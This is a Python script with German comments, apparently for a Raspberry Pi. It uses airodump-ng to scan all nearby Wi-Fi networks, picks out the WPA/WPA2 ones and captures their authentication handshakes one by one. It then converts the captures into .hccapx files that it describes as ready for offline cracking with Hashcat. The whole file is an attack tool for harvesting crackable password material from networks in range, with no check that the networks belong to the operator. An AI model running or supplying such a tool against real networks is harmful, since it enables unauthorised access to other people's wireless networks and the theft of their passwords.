
import os
import subprocess
import time
import glob

INTERFACE = "wlan1"
HANDSHAKE_DIR = "/home/pi/handshakes"
SCAN_TIME = 60  # Gesamte Scandauer für alle Netzwerke in Sekunden
HANDSHAKE_WAIT_TIME = 30  # Zeit in Sekunden, um auf Handshake pro Netzwerk zu warten

def setup():
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    print(f"[*] Verzeichnis {HANDSHAKE_DIR} eingerichtet.")

def scan_networks():
    print("[*] Starte Netzwerkscan...")
    scan_output = os.path.join(HANDSHAKE_DIR, "scan")
    try:
        # Starte airodump-ng, um Netzwerke zu scannen und die Ergebnisse als CSV zu speichern
        scan_process = subprocess.Popen(
            ["sudo", "airodump-ng", "--band", "abg", "-w", scan_output, "--output-format", "csv", INTERFACE],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(SCAN_TIME)  # Warte, bis der Scan abgeschlossen ist
        scan_process.terminate()  # Beende den Scan-Prozess
        print("[*] Netzwerkscan abgeschlossen.")
    except Exception as e:
        print(f"[!] Fehler beim Netzwerkscan: {e}")
    return f"{scan_output}-01.csv"  # Name der CSV-Datei

def parse_networks(scan_file):
    print(f"[*] Lese Netzwerke aus {scan_file}...")
    networks = []
    try:
        with open(scan_file, "r") as f:
            for line in f:
                if "WPA" in line and "WPA2" in line:
                    fields = line.split(',')
                    if len(fields) > 1:
                        bssid = fields[0].strip()
                        channel = fields[3].strip()
                        networks.append((bssid, channel))
        print(f"[*] {len(networks)} WPA/WPA2-Netzwerke gefunden.")
    except FileNotFoundError:
        print(f"[!] Die Datei {scan_file} wurde nicht gefunden.")
    return networks

def capture_handshake(bssid, channel):
    print(f"[*] Erfasse Handshake für {bssid} auf Kanal {channel}...")
    # Starte airodump-ng für das spezifische Netzwerk und warte auf Handshake
    airodump_cmd = [
        "sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w",
        f"{HANDSHAKE_DIR}/{bssid}", INTERFACE
    ]
    airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(HANDSHAKE_WAIT_TIME)  # Warte auf Handshake

    # Stoppe den airodump-ng Prozess
    airodump_process.terminate()
    airodump_process.wait()
    print(f"[*] Beende Handshake-Erfassung für {bssid}.")

def convert_to_hccapx():
    print("[*] Konvertiere Handshake-Dateien in das .hccapx-Format für Hashcat...")
    cap_files = glob.glob(f"{HANDSHAKE_DIR}/*.cap")
    if not cap_files:
        print("[!] Keine .cap-Dateien zum Konvertieren gefunden.")
    for cap_file in cap_files:
        hccapx_file = cap_file.replace(".cap", ".hccapx")
        conversion_cmd = ["hcxpcapngtool", "-o", hccapx_file, cap_file]
        subprocess.call(conversion_cmd)
        print(f"[*] {cap_file} wurde in {hccapx_file} umgewandelt.")

def main():
    setup()
    scan_file = scan_networks()
    print(f"[*] Scan abgeschlossen. CSV-Datei gespeichert unter: {scan_file}")
    networks = parse_networks(scan_file)
    if networks:
        for bssid, channel in networks:
            capture_handshake(bssid, channel)
        convert_to_hccapx()
        print(f"[*] Alle Handshakes und konvertierten Dateien sind in {HANDSHAKE_DIR} gespeichert und bereit für Hashcat.")
    else:
        print("[!] Keine WPA/WPA2-Netzwerke für die Handshake-Erfassung gefunden.")

if __name__ == "__main__":
    main()
